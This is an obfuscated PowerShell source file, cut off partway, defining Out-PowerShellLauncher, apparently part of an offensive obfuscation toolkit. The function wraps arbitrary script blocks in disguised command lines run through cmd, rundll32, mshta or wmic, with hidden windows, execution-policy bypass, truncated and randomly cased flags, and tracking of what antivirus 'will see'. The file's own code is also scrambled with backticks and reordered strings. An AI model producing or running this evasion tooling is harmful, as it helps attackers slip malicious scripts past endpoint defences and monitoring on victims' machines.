  SeT-ITem  vARiaBle:eHb  (  [TYPe]("{4}{8}{0}{2}{6}{1}{3}{7}{5}" -F'M.ma','eN','nAGE','t.aUtoMAt','Sy','aRSER','M','iOn.pSp','stE')  ) ;SET-Item  vARiAblE:jt0G (  [type]("{2}{1}{0}" -F 'Ock','pTbl','ScrI') ); 


















Function out`-PowerS`HELL`LAUN`C`HER
{


    [CmdletBinding(dEFaultpArametErsETNaMe = {"{3}{2}{1}{0}"-f 'ck','lo','ptB','Scri'})] Param (
        [Parameter(pOSItIOn = 0, VALUefrOmpIPeLiNe = ${t`RUE}, pARaMeTeRseTnAMe = "SCRi`P`TBL`OcK")]
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        ${scrIpT`BLo`CK},
        
        [Parameter(PosITIOn = 1)]
        [ValidateNotNullOrEmpty()]
        [ValidateSet(1,2,3,4,5,6,7,8,9,10,11,12)]
        [Int]
        ${LAU`NCh`TYpe},

        [Switch]
        ${NO`Exit},

        [Switch]
        ${N`oPR`OfilE},

        [Switch]
        ${nOnintErA`CT`iVe},

        [Switch]
        ${nO`LoGo},

        [Switch]
        ${w`oW64},

        [Switch]
        ${Co`MM`AnD},

        [ValidateSet({"{1}{0}{2}" -f'o','N','rmal'}, {"{0}{1}{2}"-f 'M','inimiz','ed'}, {"{1}{0}"-f 'mized','Maxi'}, {"{2}{0}{1}" -f'de','n','Hid'})]
        [String]
        ${wI`NdowS`T`YLe},

        [ValidateSet({"{0}{1}{2}"-f'B','yp','ass'}, {"{0}{2}{1}"-f 'Un','tricted','res'}, {"{1}{0}{2}{3}"-f'em','R','ote','Signed'}, {"{1}{2}{0}{3}" -f'ign','Al','lS','ed'}, {"{2}{1}{0}"-f'icted','tr','Res'})]
        [String]
        ${EXe`Cu`TIoNP`olI`CY},
        
        [Parameter(posITIon = 2)]
        [String]
        ${Sw`ItCh`eSaSSt`RinG}
    )

    
    ${A`RGsdeFenD`E`RWI`LLs`Ee} = @()

    
    ${scr`ip`T`sTri`NG} = [String]${sc`RiPt`BlocK}
    
    
    If(${Scri`p`TS`T`RiNG}."COn`T`AinS"([Char]13+[Char]10))
    {
        &("{2}{1}{0}" -f 't','te-Hos','Wri') ""
        &("{2}{0}{4}{1}{3}" -f'-W','in','Write','g','arn') ('C'+'urr'+'ent '+'s'+'cript'+' '+'co'+'nt'+'ent '+'cont'+'ai'+'ns'+' '+'n'+'ewline'+' '+"characters.`n "+' '+' '+' '+' '+' '+' '+' '+' '+'A'+'ppl'+'ying '+'a '+'l'+'a'+'unch'+'er '+'wi'+'ll '+'not'+' '+'w'+'ork '+'o'+'n '+'th'+'e '+'com'+'man'+'d '+"line.`n "+' '+' '+' '+' '+' '+' '+' '+' '+'App'+'ly '+'ENCOD'+'IN'+'G '+'obf'+'u'+'sca'+'tion '+'bef'+'ore '+'ap'+'ply'+'ing '+'LA'+'UNCHER'+'.')
        &("{2}{0}{1}" -f'lee','p','Start-S') 1
        Return ${scRiPTs`Tr`InG}
    }

    
    If(${sw`iTcheSAS`s`TRinG}."l`E`NGTH" -gt 0)
    {
        If(!(${sWItcHES`A`SStri`NG}.("{1}{2}{0}"-f'ns','Conta','i').Invoke('0')))
        {
            ${sw`ItchesA`sst`R`ing} = ([Char[]]${sw`ItC`hes`ASS`TriNG} | &("{2}{0}{3}{1}" -f'rt-Obje','t','So','c') -Unique -Descending) -Join ' '
            ForEach(${s`WItC`HasS`T`RinG} in ${s`WITC`hESaSsT`R`ING}.("{1}{0}"-f'it','Spl').Invoke(' '))
            {
                Switch(${Sw`i`TcHAs`s`TrInG})
                {
                    '1' {${n`o`eXIt}          = ${T`RUe}}
                    '2' {${noN`Inte`Ra`CtIve}  = ${t`RuE}}
                    '3' {${n`Olo`go}          = ${T`RUE}}
                    '4' {${n`OpROFI`LE}       = ${T`RUE}}
                    '5' {${cOM`ma`ND}         = ${tR`Ue}}
                    '6' {${WINDO`WsSt`YLE}    = ("{1}{0}"-f'idden','H')}
                    '7' {${exECUT`iOn`p`OL`ICy} = ("{0}{2}{1}"-f'B','pass','y')}
                    '8' {${w`OW`64}           = ${T`Rue}}
                    ("{2}{0}{1}" -f'aul','t','def') {&("{0}{2}{1}"-f 'Write','or','-Err') ('An'+' '+'in'+'vali'+'d '+"`$SwitchAsString "+'va'+'lue '+"($SwitchAsString) "+'was'+' '+'pas'+'s'+'ed '+'t'+'o '+'s'+'wi'+'tch '+'b'+'loc'+'k '+'fo'+'r '+'O'+'ut-'+'PowerS'+'h'+'ellL'+'aun'+'cher'); Exit;}
                }
            }
        }
    }

    
    ${TOk`eNs} =  ${e`hb}::"Tok`E`NIzE"(${sCRipts`T`RiNg},[ref]${NU`ll})
    ${C`HaR`S`T`OEScaPE} = @('&','|','<','>')
    For(${I}=${T`Ok`ENs}."CoU`Nt"-1; ${i} -ge 0; ${i}--)
    {
        ${toK`En} = ${toK`Ens}[${I}]
        
        
        ${prEtOK`eN`sTr}    = ${SCr`I`pTS`Tr`Ing}.("{0}{2}{1}" -f'S','String','ub').Invoke(0,${t`o`ken}."st`ARt")
        ${EXTRActE`D`Tok`eN} = ${scriPT`st`RInG}.("{2}{1}{0}"-f'ring','St','Sub').Invoke(${Tok`EN}."sta`RT",${TO`Ken}."l`En`GTH")
        ${PoSTtOkeN`S`TR}   = ${sc`RIpTsT`R`i`Ng}.("{1}{0}{2}" -f 'Str','Sub','ing').Invoke(${t`o`kEN}."ST`ArT"+${t`oken}."Le`N`gTh")
        
        
        
        If(${TOk`En}."Ty`PE" -eq ("{0}{1}"-f'S','tring') -AND !(${EX`TRACTEdt`oK`en}.("{2}{0}{3}{1}" -f'i','h','StartsW','t').Invoke("'") -AND ${exTrA`C`Te`DTOken}.("{0}{1}" -f'EndsWi','th').Invoke("'")))
        {
            ForEach(${ch`Ar} in ${c`HA`RS`TOES`cAPE})
            {
                If(${eXTRA`cT`eDTOkeN}.("{2}{1}{0}"-f'ains','ont','C').Invoke(${C`HAR})) {${ExtRACte`Dto`Ken} = ${ex`TrAcTE`dT`OkEn}.("{1}{0}{2}" -f'c','Repla','e').Invoke(${CH`AR},"^$Char")}
            }

            If(${E`Xtr`ACT`EDt`oken}.("{2}{1}{0}"-f's','in','Conta').Invoke('\')) {${eX`T`Ra`c`TEdTOKeN} = ${EXtr`AC`TeDtOKeN}.("{1}{0}"-f'eplace','R').Invoke('\','\\')}
            
            If(${eX`TRACte`d`ToKEN}.("{2}{1}{0}"-f'ns','ai','Cont').Invoke('"')) {${E`xtR`ActE`dTOKeN} = '\"' + ${e`XtRa`c`TedToken}.("{0}{1}{2}" -f'Su','bStri','ng').Invoke(1,${EX`TRaCT`EdTOK`EN}."l`E`NGTh"-1-1) + '\"'}
        }
        Else
        {
            
            If(${e`XTrac`Te`dtOkEn}.("{1}{0}" -f 'ntains','Co').Invoke('^'))
            {
                ${ExTracTEDto`k`EN`s`pliT} = ${E`xtr`ACt`EDTOK`eN}.("{0}{1}" -f'S','plit').Invoke('^')
                ${EXT`R`ACtEd`TOKEn} = ''
                For(${j}=0; ${J} -lt ${Ext`RAct`EDTOKEN`SpLiT}."cO`Unt"; ${J}++)
                {
                    ${EXt`R`Act`ED`ToKeN} += ${ExTRaCte`DTO`Ke`NS`plIt}[${j}]
                    ${FiRSTC`haRFoLl`Owi`Ng`CaRET} = ${eXtR`A`cTe`dTok`e`NsPliT}[${J}+1]
                    If(!${FirsTCHA`RFOl`lOwI`Ng`C`A`ReT} -OR (${ChArstOE`S`cA`pE} -NotContains ${f`ir`s`TC`HaRFoLlO`w`I`NGcaRET}.("{0}{2}{1}"-f'Sub','ng','Stri').Invoke(0,1)) -AND (${J} -ne ${E`XTRAcTEDToKEns`Pl`iT}."cOu`Nt"-1))
                    {
                        ${E`XtraCtedto`k`en} += ("{0}{1}" -f '^^^','^')
                    }
                }
            }

            ForEach(${C`HaR} in ${CHAR`s`ToESCA`PE})
            {
                If(${Ex`TrAcTeD`T`oken}.("{0}{2}{1}"-f'Co','ains','nt').Invoke(${ch`AR})) {${e`XtRACtEDTO`k`en} = ${EX`TrAC`T`edto`keN}.("{0}{1}{2}" -f 'Repl','ac','e').Invoke(${c`HAR},"^^^$Char")}
            }
        }
        
        
        ${Sc`RiP`TSt`RiNG} = ${p`REToKe`N`StR} + ${EXt`RA`cTEDTokEn} + ${P`ostTok`eNstr}
    }
 
    
    
    ${p`oWE`RSH`EllFlAgs} = &("{2}{1}{0}"-f '-Object','w','Ne') ("{1}{2}{0}"-f ']','Str','ing[')(0)
    If(${Ps`Bou`NDP`A`R`AmEterS}[("{1}{0}{2}" -f 'Ex','No','it')] -OR ${NOE`x`IT})
    {
        ${FulLaR`GU`mE`Nt} = ("{0}{2}{1}"-f'-N','t','oExi')
        ${p`owerS`H`eL`lFlagS} += ${fUl`La`RgUM`eNt}.("{1}{2}{0}"-f'g','Sub','Strin').Invoke(0,(&("{1}{0}{2}"-f'and','Get-R','om') -Minimum 4 -Maximum (${FUlLAR`g`U`Me`Nt}."Le`NG`Th"+1)))
    }
    If(${p`S`BouNDPAraM`eT`Ers}[("{2}{1}{0}" -f'le','Profi','No')] -OR ${NOpr`O`FilE})
    {
        ${fUL`L`ArGUmENT} = ("{1}{0}{2}{3}"-f'NoPro','-','fi','le')
        ${p`oWerSHelL`FL`A`GS} += ${f`UllARGum`ENT}.("{2}{1}{0}"-f 'ring','t','SubS').Invoke(0,(&("{0}{1}{3}{2}"-f 'Get','-Ran','m','do') -Minimum 4 -Maximum (${fu`Ll`Arg`UmEnt}."L`eng`Th"+1)))
    }
    If(${PsboUnD`pAR`AmEt`Ers}[("{3}{0}{1}{2}"-f 'a','c','tive','NonInter')] -OR ${nO`NInt`eRact`I`VE})
    {
        ${fu`LL`A`RGUmEnT} = ("{0}{2}{3}{1}" -f '-No','ctive','nInter','a')
        ${PowerShE`L`LflA`Gs} += ${f`U`LlA`RGUm`ENt}.("{2}{1}{0}"-f 'ng','ubStri','S').Invoke(0,(&("{2}{0}{1}"-f '-Rand','om','Get') -Minimum 5 -Maximum (${FuL`laR`gumenT}."l`ENgtH"+1)))
    }
    If(${pSBou`N`dp`A`RAMETers}[("{2}{1}{0}" -f'ogo','oL','N')] -OR ${No`L`OGO})
    {
        ${F`UllArg`UmENt} = ("{1}{0}"-f'go','-NoLo')
        ${POw`e`RS`he`LLflaGS} += ${FUl`lar`G`UMeNt}.("{1}{0}" -f'bString','Su').Invoke(0,(&("{1}{2}{0}" -f 'andom','Get-','R') -Minimum 4 -Maximum (${fu`LL`ArGU`MENT}."LENg`Th"+1)))
    }
    If(${psbO`UN`d`PaRamEterS}[("{0}{1}{2}{3}" -f 'W','i','ndowS','tyle')] -OR ${WinDo`wSSTY`LE})
    {
        ${fuLLAr`GUm`ENt} = ("{3}{1}{0}{2}"-f 'yl','owSt','e','-Wind')
        If(${w`IND`OW`SST`Yle}) {${ArgUM`e`Nt`VAlue} = ${WInDo`W`sSt`Yle}}
        Else {${aRg`UMe`NtVa`luE} = ${p`SbOUn`dP`A`Ra`MEtERs}[("{0}{2}{3}{1}" -f'Window','e','St','yl')]}

        
        Switch(${aRg`UM`eN`T`VAluE}.("{2}{0}{1}" -f 'w','er','ToLo').Invoke())
        {
            ("{1}{0}{2}" -f 'r','no','mal')    {If(&("{1}{2}{0}" -f 'andom','Get','-R') -Input @(0..1)) {${A`RGU`Men`Tv`ALUe} = (&("{1}{3}{2}{0}" -f 'ndom','G','t-Ra','e') -Input @('0','n','no','nor',("{0}{1}"-f 'no','rm'),("{0}{1}" -f 'nor','ma')))}}
            ("{0}{1}" -f'hid','den')    {If(&("{0}{2}{1}" -f 'Ge','andom','t-R') -Input @(0..1)) {${A`RGumEntVa`L`Ue} = (&("{0}{1}{2}" -f'Get-R','an','dom') -Input @('1','h','hi','hid',("{1}{0}"-f'idd','h'),("{0}{1}"-f 'h','idde')))}}
            ("{2}{3}{1}{0}" -f 'ized','im','m','in') {If(&("{0}{1}{2}"-f 'Ge','t-Ra','ndom') -Input @(0..1)) {${ARG`Ume`N`Tv`ALUE} = (&("{1}{0}{2}" -f'and','Get-R','om') -Input @('2','mi','min',("{1}{0}"-f'i','min'),("{1}{0}"-f'm','mini'),("{0}{1}" -f 'mini','mi'),("{1}{0}" -f'inimiz','m'),("{0}{1}"-f'minimi','ze')))}}
            ("{1}{2}{0}"-f'd','maximiz','e') {If(&("{2}{1}{0}"-f 'm','ndo','Get-Ra') -Input @(0..1)) {${ArG`Umen`TVaL`UE} = (&("{0}{1}{3}{2}"-f'G','et-','dom','Ran') -Input @('3','ma','max',("{1}{0}" -f 'axi','m'),("{0}{1}" -f 'm','axim'),("{1}{2}{0}" -f 'i','ma','xim'),("{1}{0}"-f'aximiz','m'),("{2}{1}{0}" -f'ize','im','max')))}}
            ("{0}{1}{2}"-f'd','ef','ault') {&("{1}{3}{2}{0}"-f '-Error','Wri','e','t') ('A'+'n '+'invali'+'d'+' '+"`$ArgumentValue "+'v'+'alue '+"($ArgumentValue) "+'wa'+'s '+'pass'+'e'+'d '+'t'+'o '+'sw'+'i'+'tch '+'bl'+'ock '+'for'+' '+'Out-Pow'+'erS'+'hel'+'lL'+'auncher'+'.'); Exit;}
        }

        ${p`O`weRS`He`llfLa`Gs} += ${Fu`llaRGUm`ENT}.("{0}{2}{1}"-f'Sub','ng','Stri').Invoke(0,(&("{2}{3}{0}{1}" -f '-Ra','ndom','G','et') -Minimum 2 -Maximum (${fULL`ARG`U`Ment}."LeN`Gth"+1))) + ' '*(&("{1}{0}{3}{2}" -f't-R','Ge','m','ando') -Minimum 1 -Maximum 3) + ${aR`GU`MENtv`ALUE}
    }
    If(${PS`BOu`NDpar`AmETers}[("{1}{0}{3}{2}" -f'ionPo','Execut','icy','l')] -OR ${e`X`ecU`Ti`oNPolICY})
    {
        ${fuLLARGU`M`e`Nt} = ("{2}{3}{4}{0}{1}" -f'li','cy','-Exec','u','tionPo')
        If(${ExEcU`TiO`NpOlI`CY}) {${Ar`gume`Nt`Value} = ${eXE`CutIon`PoLI`CY}}
        Else {${ARG`UME`NTVALUe} = ${P`S`BOund`PARam`EtE`Rs}[("{1}{2}{0}{3}" -f'ic','Execut','ionPol','y')]}
        
        ${ExEc`Uti`OnpOl`IcyFl`A`GS} = @()
        ${EXec`UT`IoN`PolI`CyfL`A`Gs} += '-EP'
        For(${iNd`EX}=3; ${i`N`dex} -le ${fU`LlA`R`guME`NT}."L`eng`Th"; ${iN`D`eX}++)
        {
            ${E`xeCuTIoNpOL`IC`y`FLaGs} += ${Fu`lLaRGUm`eNt}.("{2}{0}{1}"-f 't','ring','SubS').Invoke(0,${in`Dex})
        }
        ${EXecu`Tio`N`polICyFLag} = &("{1}{2}{0}"-f 'Random','Get','-') -Input ${eXecUTI`O`N`pOlicyf`l`A`gS}
        ${POw`ErsH`E`L`lFLags} += ${eXeCUt`IO`N`P`olICY`FLaG} + ' '*(&("{1}{2}{0}{3}" -f'n','Get-','Ra','dom') -Minimum 1 -Maximum 3) + ${Argu`mE`NtvAlue}
    }

    
    
    If(${pow`e`RsHelLfLA`GS}."COU`NT" -gt 1)
    {
        ${p`OWE`RS`helLf`LaGs} = &("{0}{1}{2}"-f'Get-','Rando','m') -InputObject ${pOWerS`He`lLF`lAGs} -Count ${PO`w`eR`sH`E`lLFLaGs}."C`OUnT"
    }

    
    If(${Psb`ou`NDpArAm`eTErS}[("{0}{1}"-f'Co','mmand')] -OR ${cOmm`A`Nd})
    {
        ${fuLl`A`Rg`UMENt} = ("{0}{1}"-f '-Comma','nd')
        ${p`OwEr`SHEL`LfLagS} += ${full`ARg`UmeNt}.("{0}{2}{1}" -f'Sub','ring','St').Invoke(0,(&("{0}{1}{3}{2}"-f'G','et','om','-Rand') -Minimum 2 -Maximum (${FUll`A`RguMENT}."L`EnGTH"+1)))
    }

    
    For(${i}=0; ${i} -lt ${p`oweRS`heL`lfLaGs}."C`OUnT"; ${i}++)
    {
        ${P`OWersH`E`Llf`LaGS}[${I}] = ([Char[]]${PoW`e`RshEll`Fl`AGS}[${i}] | &("{1}{0}{3}{2}{4}" -f'r','Fo','ach','E','-Object') {${C`HAR} = ${_}.("{1}{0}"-f 'ng','ToStri').Invoke().("{1}{2}{0}"-f'r','T','oLowe').Invoke(); If(&("{2}{0}{1}" -f'Ra','ndom','Get-') -Input @(0..1)) {${CH`AR} = ${C`haR}.("{1}{0}{2}"-f'Up','To','per').Invoke()} ${C`haR}}) -Join ''
    }

    
    
    ${pOwErSheL`Lf`lags`AR`RAy} = ${PoWE`RS`h`ELLFL`AgS}
    ${p`owErSh`EL`lf`LaGs} = (${P`oWeRs`HE`Llfl`AGs} | &("{4}{2}{0}{3}{1}" -f 'a','ect','E','ch-Obj','For') {${_} + ' '*(&("{2}{0}{1}" -f 't-R','andom','Ge') -Minimum 1 -Maximum 3)}) -Join ''
    ${pow`Er`sHe`Ll`FLAGS} = ' '*(&("{1}{2}{0}" -f 'm','Get-','Rando') -Minimum 1 -Maximum 3) + ${PO`WE`RsHEL`LFLaGs} + ' '*(&("{0}{2}{1}" -f'Get-Ran','om','d') -Minimum 1 -Maximum 3)

    
    ${wIN`p`ATh}      = ((("{0}{3}{2}{1}"-f 'C:{0','WS','DO','}WIN'))  -F[CHar]92)
    ${SY`S`T`em32pATh} = ((("{2}{3}{4}{6}{5}{1}{0}"-f '2','DOWS{0}system3','C:','{','0}W','N','I'))  -F  [cHAR]92)
    ${Pa`Th`ToR`UNDLl} = &("{2}{0}{1}"-f 't-Ra','ndom','Ge') -Input @("$System32Path\rundll32"  , "$System32Path\rundll32.exe"  , ("{1}{0}"-f'2','rundll3') , ("{1}{0}{2}{3}"-f'll32','rund','.e','xe'))
    ${PAtHT`omSh`TA}  = &("{1}{0}{2}"-f 't-R','Ge','andom') -Input @("$System32Path\mshta"     , "$System32Path\mshta.exe"     , ("{0}{1}" -f 'ms','hta')    , ("{1}{3}{0}{2}" -f'a.ex','ms','e','ht'))
    ${P`At`Hto`CmD}    = &("{3}{0}{1}{2}" -f 'Ra','ndo','m','Get-') -Input @("$System32Path\cmd"       , "$System32Path\cmd.exe"       , ("{1}{2}{0}" -f 'xe','cm','d.e')  , "cmd")
    ${PaT`HtO`C`Lip}   = &("{1}{2}{0}" -f'andom','Get','-R') -Input @("$System32Path\clip"      , "$System32Path\clip.exe"      , ("{0}{1}" -f'cli','p')     , ("{0}{1}"-f 'c','lip.exe'))
    ${Pa`TH`TOWm`iC}   = &("{3}{0}{1}{2}" -f'-R','a','ndom','Get') -Input @("$System32Path\WBEM\wmic" , "$System32Path\WBEM\wmic.exe" , ("{0}{1}" -f 'wmi','c')     , ("{1}{2}{0}"-f'e','w','mic.ex'))
    
    
    If(${pAT`H`ToCMD}.("{0}{2}{1}" -f'Cont','ns','ai').Invoke('\'))
    {
        ${PaT`Ht`Oc`mD} = ${p`AT`htOcmD} + ' '*(&("{3}{1}{0}{2}" -f 'Rando','et-','m','G') -Minimum 2 -Maximum 4)
    }
    Else
    {
        ${P`ATH`ToC`MD} = ${path`T`oCmd} + ' '*(&("{2}{1}{0}{3}"-f 'a','R','Get-','ndom') -Minimum 0 -Maximum 4)
    }

    If(${P`sbou`N`DPa`RAmEt`ERs}[("{1}{0}" -f'4','Wow6')] -OR ${wOw`64})
    {
        ${P`ATHTo`POWErsHe`lL} = "$WinPath\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
    }
    Else
    {
        
        
        ${P`AThTo`p`OW`eRsH`ElL} = ("{0}{2}{1}"-f 'powe','l','rshel')
    }

    
    ${pO`w`eR`shellflAgS}  = ([Char[]]${pOwER`sHeL`l`FLAgS}.("{0}{1}"-f'ToLowe','r').Invoke()  | &("{3}{4}{2}{1}{0}" -f'ject','h-Ob','ac','F','orE') {${C`hAr} = ${_}; If(&("{2}{1}{0}{3}" -f'nd','-Ra','Get','om') -Input (0..1)){${C`HAR} = ${cH`AR}.("{1}{0}" -f 'oString','T').Invoke().("{0}{1}" -f'ToU','pper').Invoke()} ${c`HAR}}) -Join ''
    ${P`AThTo`POwERSh`elL} = ([Char[]]${p`At`HToP`owErsh`eLl}.("{2}{0}{1}"-f'we','r','ToLo').Invoke() | &("{3}{0}{1}{2}" -f'ac','h-O','bject','ForE') {${ch`Ar} = ${_}; If(&("{2}{0}{1}" -f 'ando','m','Get-R') -Input (0..1)){${Ch`Ar} = ${cH`AR}.("{0}{1}" -f 'ToS','tring').Invoke().("{0}{1}{2}"-f 'T','oUpp','er').Invoke()} ${C`hAr}}) -Join ''
    ${Patht`O`Run`DlL}     = ([Char[]]${Pa`TH`T`O`RUnDLl}.("{0}{2}{1}"-f'ToLow','r','e').Invoke()     | &("{1}{0}{2}" -f 'rEach-Ob','Fo','ject') {${C`haR} = ${_}; If(&("{0}{2}{1}"-f'Get-Rand','m','o') -Input (0..1)){${c`hAr} = ${c`Har}.("{1}{0}{2}"-f 'in','ToStr','g').Invoke().("{1}{0}"-f'er','ToUpp').Invoke()} ${ch`Ar}}) -Join ''
    ${p`AThTO`mshTA}      = ([Char[]]${Path`TO`mSHtA}.("{2}{0}{1}" -f'oLo','wer','T').Invoke()      | &("{0}{2}{1}"-f'ForEa','ct','ch-Obje') {${C`HaR} = ${_}; If(&("{0}{2}{1}" -f 'Ge','andom','t-R') -Input (0..1)){${ch`AR} = ${C`HaR}.("{2}{0}{1}" -f'oStr','ing','T').Invoke().("{2}{0}{1}" -f 'pe','r','ToUp').Invoke()} ${ch`AR}}) -Join ''
    ${PAt`HT`ocMD}        = ([Char[]]${P`ATHTo`CMD}.("{0}{1}" -f'To','Lower').Invoke()        | &("{1}{3}{2}{0}" -f 'ect','ForEach-O','j','b') {${ch`AR} = ${_}; If(&("{2}{1}{0}" -f'Random','t-','Ge') -Input (0..1)){${ch`Ar} = ${c`har}.("{1}{0}{2}"-f'Strin','To','g').Invoke().("{1}{2}{0}" -f'r','ToUpp','e').Invoke()} ${Ch`Ar}}) -Join ''
    ${P`At`htOC`liP}       = ([Char[]]${p`AThToC`LIP}.("{2}{0}{1}"-f 'e','r','ToLow').Invoke()       | &("{0}{2}{1}"-f'Fo','-Object','rEach') {${c`hAR} = ${_}; If(&("{1}{2}{0}" -f'om','Ge','t-Rand') -Input (0..1)){${CH`Ar} = ${cH`AR}.("{1}{0}"-f'ing','ToStr').Invoke().("{2}{1}{0}"-f 'r','oUppe','T').Invoke()} ${c`hAr}}) -Join ''
    ${paT`htOWm`iC}       = ([Char[]]${pA`T`HtOwM`Ic}.("{0}{1}{2}"-f 'ToL','owe','r').Invoke()       | &("{2}{0}{4}{3}{1}" -f'orEach-','ect','F','bj','O') {${C`HAr} = ${_}; If(&("{1}{2}{0}" -f'm','Get','-Rando') -Input (0..1)){${c`hAR} = ${C`HaR}.("{0}{2}{1}"-f 'ToSt','g','rin').Invoke().("{1}{0}"-f'per','ToUp').Invoke()} ${ch`Ar}}) -Join ''
    ${s`LA`Shc}           = ([Char[]]'/c'.("{1}{0}{2}"-f'ow','ToL','er').Invoke()              | &("{1}{0}{2}{4}{3}" -f'r','Fo','Each-Ob','ect','j') {${c`har} = ${_}; If(&("{2}{0}{1}"-f'-','Random','Get') -Input (0..1)){${CH`Ar} = ${cH`Ar}.("{0}{1}{2}" -f 'ToSt','rin','g').Invoke().("{0}{1}"-f'T','oUpper').Invoke()} ${C`HaR}}) -Join ''
    ${e`chO}             = ([Char[]]("{1}{0}" -f'o','ech').("{1}{0}"-f'r','ToLowe').Invoke()            | &("{0}{1}{3}{2}{4}" -f 'F','or','c','Each-Obje','t') {${Ch`Ar} = ${_}; If(&("{1}{2}{0}"-f 'andom','Get','-R') -Input (0..1)){${cH`Ar} = ${c`HAr}.("{1}{2}{0}" -f 'ing','ToSt','r').Invoke().("{0}{2}{1}"-f'ToU','per','p').Invoke()} ${Ch`Ar}}) -Join ''

    
    ${N`UMBeroFD`o`UB`l`EQuOteS} = ${sC`RIptsTr`I`NG}."lEN`G`Th"-${scripTs`Tr`Ing}.("{1}{0}" -f'place','Re').Invoke('"','')."le`NgTh"
    If(${nUmbERoFdOUb`Le`Q`U`Otes}%2 -eq 1)
    {
        &("{2}{1}{0}"-f't','Hos','Write-') ""
        &("{0}{1}{2}{4}{3}" -f'Wr','i','te-W','ing','arn') ('T'+'his '+'comm'+'and '+'c'+'ontai'+'ns'+' '+'a'+'n '+'unba'+'la'+'nc'+'ed '+'n'+'umber'+' '+'o'+'f '+'d'+'ouble '+'q'+'uotes '+"($NumberOfDoubleQuotes).`n "+' '+' '+' '+' '+' '+' '+' '+' '+'Try'+' '+'ap'+'plyi'+'ng '+'STRI'+'NG'+' '+'or'+' '+'ENCO'+'DING'+' '+'obfuscati'+'on'+' '+'opt'+'ions'+' '+'fi'+'rs'+'t '+'to'+' '+'encode'+' '+'the'+' '+'d'+'o'+'uble '+"quotes.`n")
        &("{1}{2}{0}"-f '-Sleep','S','tart') 1
        Return ${SCRiPt`s`T`RI`Ng}
    }

    
    If(${La`UNch`TyPe} -eq 0)
    {
        ${La`UnChTY`pe} = &("{0}{2}{1}"-f 'G','m','et-Rando') -Input @(3..12)
    }

    
    Switch(${laUn`ChT`ypE})
    {
        1 {
              
              
              

              
              ForEach(${C`haR} in ${ChARSt`O`eSca`PE})
              {
                  If(${S`criPtST`RiNg}.("{0}{1}"-f'Conta','ins').Invoke("^^^$Char")) {${S`cRIpt`S`TrINg} = ${s`crI`ptst`R`InG}.("{0}{1}" -f'Repl','ace').Invoke("^^^$Char",${C`hAR})}
              }
              If(${SC`R`ipTS`TRinG}.("{1}{2}{0}"-f'ns','Co','ntai').Invoke(("{0}{1}" -f'^^^','^')))
              {
                  ${Sc`RIpts`Tri`Ng} = ${s`c`RI`PtS`TRinG}.("{1}{0}"-f'lace','Rep').Invoke(("{0}{1}" -f '^','^^^'),'^')
              }

              
              ${p`s`CMDSYNT`Ax} = ${poW`eR`SHel`Lf`LAgs} + '"' + ${scRip`TStR`i`Ng} + '"'
    
              
              ${Ar`GsdeFeNdERwIl`l`s`EE} += , @(${PAt`Hto`po`wERs`hELL}, ${pScm`Dsy`NT`AX})

              ${CmDlINeO`U`T`PUt} = ${Pa`Th`TOpO`WErSh`elL} + ${p`SCmd`sY`Ntax}
          }
        2 {
              
              
              

              
              ForEach(${c`hAR} in ${chaRSto`esc`APe})
              {
                  If(${S`C`RIp`Ts`TriNg}.("{1}{2}{0}" -f's','Con','tain').Invoke("^^^$Char")) {${sCrIPts`Tri`Ng} = ${S`CRiPT`s`TrINg}.("{1}{2}{0}"-f'place','R','e').Invoke("^^^$Char",${Ch`AR})}
                  If(${s`cRIpts`TriNG}.("{2}{0}{1}" -f 'ntain','s','Co').Invoke("^$Char")) {${S`cr`Ipts`TRINg} = ${S`cRi`PtstRI`NG}.("{0}{1}" -f'Repla','ce').Invoke("^$Char","^^^$Char")}
              }
              If(${sc`RiPTSt`Ri`NG}.("{2}{0}{1}"-f 'n','tains','Co').Invoke(("{1}{0}" -f '^^','^^')))
              {
                  ${sCR`iPtS`TR`ing} = ${scr`IptsT`RInG}.("{1}{0}{2}"-f 'pl','Re','ace').Invoke(("{1}{0}"-f '^^','^^'),'^')
              }

              
              ${pSC`m`dSynTAx} = ${pO`W`E`Rshel`LF`LAGs} + '"' + ${s`Cr`I`PTstRInG} + '"'
              ${cMDS`yNt`Ax}   = ${S`Las`Hc} + ' '*(&("{2}{0}{1}" -f 'a','ndom','Get-R') -Minimum 0 -Maximum 4) + ${PaT`HtOPo`wERShe`ll} + ${PScM`ds`Y`NtAx}
    
              
              ${a`RGsDefENd`ERw`iL`L`SeE} += , @(${pa`Tht`OC`md}       , ${CM`dSynT`AX})
              ${ARG`SD`efEN`deR`WIlLSeE} += , @(${patHtoPoWe`R`Sh`ell}, ${ps`C`mD`SYNTaX})

              ${cM`DLiNe`OutP`UT} = ${paTh`T`ocMD} + ${cmD`s`y`NtaX}
          }
        3 {
              
              
              

              
              For(${I}=1; ${I} -le 12; ${i}++)
              {
                  ${STring`T`orEP`laCe} = '${' + ' '*${I} + '}'
                  If(${S`CrI`Pt`StRING}.("{1}{0}{2}"-f'ain','Cont','s').Invoke(${S`Tr`iNG`TO`REPlace}))
                  {
                      ${scRI`PtStR`Ing} = ${SCRI`PTstR`i`Ng}.("{0}{1}"-f 'Re','place').Invoke(${s`Tri`NGtOREpLa`ce},${STRi`N`g`TO`REpLaCE}.("{2}{1}{0}"-f 'ace','pl','Re').Invoke(' ','\ '))
                  }
              }

              
              ForEach(${c`haR} in ${CH`Ars`TO`ESca`PE})
              {
                  While(${s`crIPTs`TRINg}.("{1}{0}{2}" -f'ntai','Co','ns').Invoke('^' + ${C`hAr}))
                  {
                      ${SCr`IP`T`strInG} = ${Sc`Rip`Tstri`NG}.("{0}{1}"-f'Re','place').Invoke(('^' + ${C`HAr}),${CH`Ar})
                  }
              }
              If(${s`c`RiptsTring}.("{0}{2}{1}" -f 'C','ns','ontai').Invoke(("{1}{0}" -f '^^^','^')))
              {
                  ${sCr`iPTSTR`I`Ng} = ${Sc`Ri`pTstr`iNg}.("{1}{0}"-f'e','Replac').Invoke(("{1}{0}"-f '^','^^^'),'^')
              }

              
              If(${scriPt`STR`ING}.("{1}{0}{2}"-f 'ontai','C','ns').Invoke(','))
              {
                  
                  ${seTVAri`A`B`Les} = ''

                  
                  If(${scR`ip`TS`TriNG}.("{1}{2}{0}"-f 'ins','Co','nta').Invoke('$'))
                  {
                      ${Scri`pTst`Ri`NG} = ${s`C`RiPtsTr`ing}.("{0}{1}"-f'Repl','ace').Invoke('$','`$')
                         
                      
                      If(${Scri`PTS`TriNg}.("{1}{0}"-f 'ins','Conta').Invoke('``$'))
                      {
